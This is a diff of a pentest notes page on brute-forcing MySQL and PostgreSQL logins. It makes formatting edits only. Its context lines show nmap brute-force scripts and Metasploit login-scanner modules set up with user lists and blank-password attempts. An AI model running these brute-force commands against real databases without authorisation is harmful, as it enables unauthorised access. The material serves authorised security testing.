@@ -17,7 +17,8 @@
 `nmap` uses default password and user lists, but do plug in other lists:
 
 ### MySQL
-Reduce the pool of users for the brute-force attack by [user enumeration](../recon/databases.md).
+
+Reduce the pool of users for the brute-force attack by user enumeration.
 
 ```text
 # nmap --script mysql-brute <target>
@@ -26,6 +27,7 @@ Reduce the pool of users for the brute-force attack by [user enumeration](../rec
 ```
 
 ### PostgreSQL
+
 ```text
 # nmap -p 5432 --script pgsql-brute <target>
 ```
@@ -33,6 +35,7 @@ Reduce the pool of users for the brute-force attack by [user enumeration](../rec
 ## Metasploit
 
 ### MySQL
+
 ```text
 msf > use auxiliary/scanner/mysql/mysql_login
 msf auxiliary(mysql_login) > set USER_FILE /root/login/logins
@@ -42,6 +45,7 @@ msf auxiliary(mysql_login) > exploit
 ```
 
 ### PostgreSQL
+
 ```text
 msf > use auxiliary/scanner/postgres/postgres_login
 msf auxiliary(postgres_login) > set BLANK_PASSWORDS True
